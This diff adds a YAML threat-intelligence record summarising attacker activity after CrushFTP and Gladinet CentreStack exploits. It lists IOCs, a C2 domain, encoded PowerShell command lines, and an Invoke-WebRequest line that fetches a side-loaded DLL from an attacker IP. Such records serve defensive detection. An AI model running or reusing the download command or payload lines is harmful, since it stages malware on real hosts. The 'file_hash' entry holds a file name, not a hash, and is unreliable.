@@ -1,0 +1,46 @@
+description: Huntress analysts observed consistent threat actor tactics, techniques,
+  and procedures (TTPs) across multiple incidents initiated by different vulnerabilities
+  (CrushFTP CVE-2025-31161 and Gladinet CentreStack & Triofox CVE-2025-30406). The
+  attackers utilized similar methods post-initial access, including the deployment
+  of Mesh Agent and side-loading malicious DLLs.
+date: '2025-05-06'
+authors:
+- Huntress Adversary Tactics
+attribution: Unknown
+malware_families:
+- Cobalt Strike
+- TgBot
+TTPs:
+  processs:
+  - CrushFTPService.exe
+  - powershell.exe
+  - Centre.exe
+  - mesch.exe
+  commandline:
+  - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -encodedCommandSQBUAHYAbwBrAGUALQBXAGUAYgBSAGUACQBTAGUACWBOACAALQB1AHIAaQAgAGEAdABOAHAAOgAVAC8AMQASADYALgAYADUAMQAUADgEANQAUADMAMQAGADEAMAA4ADKALWBKADMAZAAXADEALgBKAGWAbAAgACOAbWB1AHQAZgBpAGWAZQAZAEMAOgBCcAFUACWBIAHIACWBCAFAADQBIAGW...
+  - powershell.exe -encodedCommandSQBUAHYAbwBrAGUALQBXAGUAYgBSAGUACQBTAGUACWBOACAALQB1AHIAaQAgAGEAdABOAHAAOgAVAC8AMQASADYALgAYADUAMQAUADgEANQAUADMAMQAGADEAMAA4ADKALWBKADMAZAAXADEALgBKAGWAbAAgACOAbWB1AHQAZgBpAGWAZQAZAEMAOgBCcAFUACWBIAHIACWBCAFAADQBIAGW...
+  - C:\\Users\\Public\\Downloads\\Centre.exe %
+  powershell:
+  - Invoke-WebRequest -uri http://196.251.85.31:8089/d3d11.dll -outfileC:\\Users\\Public\\Downloads\\d3d11.dll
+  registry_keys: {}
+  network_connections:
+  - port: '2087'
+    destination: rtb[.]mftadsrvr[.]com
+  file_modifications:
+  - path: C:\\Windows\\Temp\\d3d11.dll
+  - path: C:\\Users\\Public\\Downloads\\d3d11.dll
+  - path: C:\\Users\\Public\\Downloads\\Centre.exe
+  persistence: {}
+  pipes: {}
+  process_relations: {}
+IOCs:
+- ip: 2.58.56[.]16
+- ip: 196.251.85[.]31
+- domain: rtb[.]mftadsrvr[.]com
+- file_path: C:\\Windows\\Temp\\d3d11.dll
+- file_path: C:\\Users\\Public\\Downloads\\d3d11.dll
+- file_path: C:\\Users\\Public\\Downloads\\Centre.exe
+- domain: mftadsrvr[.]com
+- file_hash: d3d11.dll
+reference: https://www.huntress.com/blog/do-tigers-really-change-their-stripes
+file_creation_date: May 12, 2025
